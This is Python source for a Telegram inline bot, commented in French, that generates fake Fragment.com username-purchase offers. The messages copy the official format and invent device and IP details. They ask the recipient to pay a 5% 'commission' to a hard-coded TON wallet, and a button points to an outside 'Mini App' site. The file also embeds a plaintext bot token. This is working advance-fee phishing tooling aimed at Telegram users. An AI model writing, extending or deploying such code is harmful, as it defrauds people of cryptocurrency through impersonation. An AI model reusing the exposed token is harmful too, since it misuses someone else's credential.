import os
import time
import urllib.request
import json
import asyncio
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs
import threading
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, MessageEntity, WebAppInfo
from telegram.ext import Application, InlineQueryHandler, ContextTypes

# Configuration
BOT_TOKEN = '7975400880:AAFMJ5ya_sMdLLMb7OjSbMYiBr3IhZikE6c'
PORT = int(os.getenv('PORT', 10000))
WEBHOOK_URL = "https://telegram-bot-vic3.onrender.com"
WEBAPP_URL = "https://myminiapp.onrender.com"  # 🔗 URL de votre site web

print(f"🤖 Inline Fragment Deal Generator v4.7")
print(f"🔑 Token: ✅")
print(f"🌐 Port: {PORT}")
print(f"🔗 Webhook: {WEBHOOK_URL}")
print(f"📱 Web App: {WEBAPP_URL}")

# Variables globales
app = None
event_loop = None

def get_ton_price():
    """Récupère le prix du TON en temps réel"""
    try:
        # API CoinGecko plus fiable
        url = "https://api.coingecko.com/api/v3/simple/price?ids=the-open-network&vs_currencies=usd"
        with urllib.request.urlopen(url, timeout=10) as response:
            data = json.loads(response.read().decode())
            price = float(data['the-open-network']['usd'])
            print(f"💰 Prix TON récupéré: ${price:.4f}")
            return price
    except Exception as e:
        print(f"❌ Erreur API CoinGecko: {e}")
        # Fallback vers DIA API
        try:
            url = "https://api.diadata.org/v1/assetQuotation/Ton/0x0000000000000000000000000000000000000000"
            with urllib.request.urlopen(url, timeout=5) as response:
                data = json.loads(response.read().decode())
                price = float(data.get('Price', 5.50))
                print(f"💰 Prix TON (fallback): ${price:.4f}")
                return price
        except Exception as e2:
            print(f"❌ Erreur API DIA: {e2}")
            # Prix par défaut si toutes les APIs échouent
            return 5.50

def generate_fragment_message(username, ton_amount):
    """Génère le message Fragment avec formatage identique au bot original"""
    
    # Prix TON actuel - récupération en temps réel
    ton_price = get_ton_price()
    
    # Calculs
    price = float(ton_amount)
    price_usd = price * ton_price
    commission = price * 0.05
    commission_usd = commission * ton_price
    
    # Adresse wallet
    wallet_address = "UQBBlxK8VBxEidbxw4oQVyLSk7iEf9VPJxetaRQpEbi-XDPR"
    
    # Message Fragment - IDENTIQUE au bot original
    fragment_message = f"""We have received a purchase request for your username @{username} via Fragment.com. Below are the transaction details:

• Offer Amount: 💎{price:g} (${price_usd:.2f} USD)
• Commission: 💎{commission:g} (${commission_usd:.2f} USD)

Please note that a 5% commission is charged to the seller prior to accepting the deal. This ensures a secure and efficient transaction process.

Additional Information:
• Device: Safari on macOS  
• IP Address: 103.56.72.245
• Wallet: {wallet_address}

Important:
• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible.
• If you choose not to proceed, simply ignore this message."""
    
    return fragment_message, wallet_address, commission, commission_usd

async def inline_query_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Gestionnaire des requêtes inline"""
    try:
        from telegram import InlineQueryResultArticle, InputTextMessageContent
        
        query = update.inline_query.query.strip() if update.inline_query.query else ""
        
        # Si pas de requête - AFFICHER L'AIDE
        if not query:
            results = [
                InlineQueryResultArticle(
                    id="help_usage",
                    title="💡 Comment utiliser ce bot",
                    description="Format: @username montant (ex: alice 5.5)",
                    input_message_content=InputTextMessageContent(
                        message_text="ℹ️ Utilisation du bot Fragment Deal Generator:\n\n"
                                   "Format: **@username montant**\n"
                                   "Exemple: `alice 5.5` ou `@bob 10`\n\n"
                                   "Ce format génère un message de deal Fragment professionnel.",
                        parse_mode='Markdown'
                    )
                )
            ]
            await update.inline_query.answer(results, cache_time=1)
            return
        
        # Parsing de la requête (username montant)
        parts = query.split()
        
        # Si format incorrect - AFFICHER L'AIDE ET SUGGESTION
        if len(parts) < 2:
            results = [
                InlineQueryResultArticle(
                    id="help_format",
                    title="⚠️ Format incorrect",
                    description=f"Tapé: '{query}' - Format attendu: username montant",
                    input_message_content=InputTextMessageContent(
                        message_text="❌ Format incorrect détecté\n\n"
                                   f"Vous avez tapé: `{query}`\n"
                                   "Format correct: **@username montant**\n\n"
                                   "Exemples:\n"
                                   "• `alice 5.5`\n"
                                   "• `@bob 10`\n"
                                   "• `charlie 2.75`",
                        parse_mode='Markdown'
                    )
                )
            ]
            await update.inline_query.answer(results, cache_time=1)
            return
        
        username = parts[0].replace('@', '')  # Supprime @ si présent
        
        try:
            ton_amount = float(parts[1])
            if ton_amount <= 0:
                raise ValueError("Montant doit être positif")
        except ValueError:
            # Si montant invalide - AFFICHER ERREUR INFORMATIVE
            results = [
                InlineQueryResultArticle(
                    id="error_amount",
                    title="❌ Montant invalide",
                    description=f"'{parts[1]}' n'est pas un montant valide",
                    input_message_content=InputTextMessageContent(
                        message_text="⚠️ Montant invalide détecté\n\n"
                                   f"Username: `@{username}` ✅\n"
                                   f"Montant: `{parts[1]}` ❌\n\n"
                                   "Le montant doit être:\n"
                                   "• Un nombre positif\n"
                                   "• Exemples valides: 5, 10.5, 2.75",
                        parse_mode='Markdown'
                    )
                )
            ]
            await update.inline_query.answer(results, cache_time=1)
            return
        
        # Génération du message Fragment - EXACTEMENT identique au bot original
        fragment_message, wallet_address, commission, commission_usd = generate_fragment_message(username, ton_amount)
        
        # Calcul pour la description
        ton_price = get_ton_price()
        price_usd = ton_amount * ton_price
        
        # Création des entités pour le formatage - EXACTEMENT identique au bot original
        entities = []
        
        # 1. Offer Amount en gras
        offer_text = f"• Offer Amount: 💎{ton_amount:g} (${price_usd:.2f} USD)"
        offer_start = fragment_message.find(offer_text)
        if offer_start != -1:
            entities.append(MessageEntity(
                type=MessageEntity.BOLD,
                offset=offer_start,
                length=len(offer_text)
            ))
        
        # 2. Commission en gras
        commission_text = f"• Commission: 💎{commission:g} (${commission_usd:.2f} USD)"
        commission_start = fragment_message.find(commission_text)
        if commission_start != -1:
            entities.append(MessageEntity(
                type=MessageEntity.BOLD,
                offset=commission_start,
                length=len(commission_text)
            ))
        
        # 3. Premier point Important en gras
        important_text1 = "• Please proceed only if you are willing to transform your username into a collectible. This action is irreversible."
        important_start1 = fragment_message.find(important_text1)
        if important_start1 != -1:
            entities.append(MessageEntity(
                type=MessageEntity.BOLD,
                offset=important_start1,
                length=len(important_text1)
            ))
        
        # 4. Deuxième point Important en gras
        important_text2 = "• If you choose not to proceed, simply ignore this message."
        important_start2 = fragment_message.find(important_text2)
        if important_start2 != -1:
            entities.append(MessageEntity(
                type=MessageEntity.BOLD,
                offset=important_start2,
                length=len(important_text2)
            ))
        
        # 5. Wallet cliquable - LONGUEUR CORRECTE (48 caractères: UQ...PR)
        wallet_start = fragment_message.find(wallet_address)
        if wallet_start != -1:
            entities.append(MessageEntity(
                type=MessageEntity.TEXT_LINK,
                offset=wallet_start,
                length=48,  # Longueur exacte de UQ...PR (48 caractères)
                url=f"https://tonviewer.com/{wallet_address}"
            ))
            print(f"🔗 Wallet link: position {wallet_start}, longueur 48 caractères")
        
        # UN SEUL bouton - EXACTEMENT comme dans le bot original
        keyboard = InlineKeyboardMarkup([
            [InlineKeyboardButton("🌐 Mini App", web_app=WebAppInfo(url=WEBAPP_URL))]
        ])
        
        # Résultat inline
        results = [
            InlineQueryResultArticle(
                id=f"fragment_deal_{username}_{ton_amount}",
                title=f"Fragment Deal: @{username}",
                description=f"💰 {ton_amount} TON (${price_usd:.2f} USD) - Commission: {commission:g} TON",
                input_message_content=InputTextMessageContent(
                    message_text=fragment_message,
                    entities=entities
                ),
                reply_markup=keyboard,
                thumb_url="https://i.imgur.com/fragment.png"
            )
        ]
        
        print(f"✅ Deal généré: @{username} pour {ton_amount} TON (${price_usd:.2f} USD)")
        await update.inline_query.answer(results, cache_time=1)
        
    except Exception as e:
        print(f"❌ Erreur dans inline_query_handler: {e}")
        # En cas d'erreur, afficher un message d'erreur informatif
        error_results = [
            InlineQueryResultArticle(
                id="error_general",
                title="🔧 Erreur technique",
                description="Une erreur est survenue, veuillez réessayer",
                input_message_content=InputTextMessageContent(
                    message_text="⚠️ Une erreur technique est survenue\n\n"
                               "Veuillez réessayer avec le format: `username montant`",
                    parse_mode='Markdown'
                )
            )
        ]
        await update.inline_query.answer(error_results, cache_time=1)

class WebhookHandler(BaseHTTPRequestHandler):
    def do_POST(self):
        """Traite les webhooks de Telegram"""
        try:
            content_length = int(self.headers.get('Content-Length', 0))
            post_data = self.rfile.read(content_length)
            
            # Traitement asynchrone du webhook
            if event_loop and not event_loop.is_closed():
                asyncio.run_coroutine_threadsafe(
                    self.process_webhook(post_data), 
                    event_loop
                )
            
            self.send_response(200)
            self.end_headers()
            
        except Exception as e:
            print(f"❌ Erreur webhook: {e}")
            self.send_response(500)
            self.end_headers()
    
    def do_GET(self):
        """Page de status simple"""
        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.end_headers()
        
        status = f"✅ Bot Status: Online\n🕐 Time: {time.strftime('%Y-%m-%d %H:%M:%S UTC')}\n📱 Web App (Intégrée): {WEBAPP_URL}"
        self.wfile.write(status.encode('utf-8'))
    
    def log_message(self, format, *args):
        """Désactiver les logs HTTP"""
        pass
    
    async def process_webhook(self, post_data):
        """Traite les données du webhook de manière asynchrone"""
        try:
            if app:
                update_data = json.loads(post_data.decode('utf-8'))
                update = Update.de_json(update_data, app.bot)
                await app.process_update(update)
        except Exception as e:
            print(f"❌ Erreur traitement webhook: {e}")

async def setup_application():
    """Configuration de l'application Telegram"""
    global app
    
    print("⚙️ Configuration de l'application...")
    app = Application.builder().token(BOT_TOKEN).build()
    
    # Ajout du handler inline
    app.add_handler(InlineQueryHandler(inline_query_handler))
    
    print("🔗 Configuration des handlers terminée")
    return app

async def setup_webhook():
    """Configuration du webhook"""
    try:
        print("🌐 Configuration du webhook...")
        
        webhook_url = f"{WEBHOOK_URL}/"
        
        # Configuration du webhook avec requête HTTP directe
        url = f"https://api.telegram.org/bot{BOT_TOKEN}/setWebhook"
        data = json.dumps({
            "url": webhook_url,
            "allowed_updates": ["inline_query"]
        }).encode('utf-8')
        
        req = urllib.request.Request(
            url, 
            data=data, 
            headers={'Content-Type': 'application/json'}
        )
        
        with urllib.request.urlopen(req) as response:
            result = json.loads(response.read().decode('utf-8'))
            
            if result.get('ok'):
                print(f"✅ Webhook configuré: {webhook_url}")
                return True
            else:
                print(f"❌ Erreur webhook: {result}")
                return False
                
    except Exception as e:
        print(f"❌ Erreur configuration webhook: {e}")
        return False

def start_http_server():
    """Démarre le serveur HTTP"""
    try:
        print(f"🌍 Démarrage serveur HTTP sur port {PORT}...")
        server = HTTPServer(('0.0.0.0', PORT), WebhookHandler)
        server.serve_forever()
    except Exception as e:
        print(f"❌ Erreur serveur HTTP: {e}")

async def setup_bot():
    """Configuration complète du bot"""
    global event_loop
    
    # Sauvegarde de la boucle d'événements
    event_loop = asyncio.get_event_loop()
    
    # Configuration de l'application
    await setup_application()
    
    # Configuration du webhook
    webhook_success = await setup_webhook()
    if not webhook_success:
        print("❌ Échec configuration webhook")
        return
    
    # Démarrage du serveur HTTP dans un thread séparé
    server_thread = threading.Thread(target=start_http_server, daemon=True)
    server_thread.start()
    
    print("🚀 Bot inline Fragment Deal démarré!")
    print(f"📱 Web App intégrée: {WEBAPP_URL}")
    print("💡 Utilisez le bot en inline: @votre_bot_username alice 5.5")
    
    # Maintient le bot en vie
    try:
        while True:
            await asyncio.sleep(1)
    except KeyboardInterrupt:
        print("🛑 Arrêt du bot...")

def main():
    """Fonction principale"""
    try:
        print("🚀 Démarrage du bot inline...")
        
        # Démarrage asynchrone
        asyncio.run(setup_bot())
        
    except KeyboardInterrupt:
        print("🛑 Arrêt du bot...")
    except Exception as e:
        print(f"❌ Erreur critique: {e}")

if __name__ == '__main__':
    main()
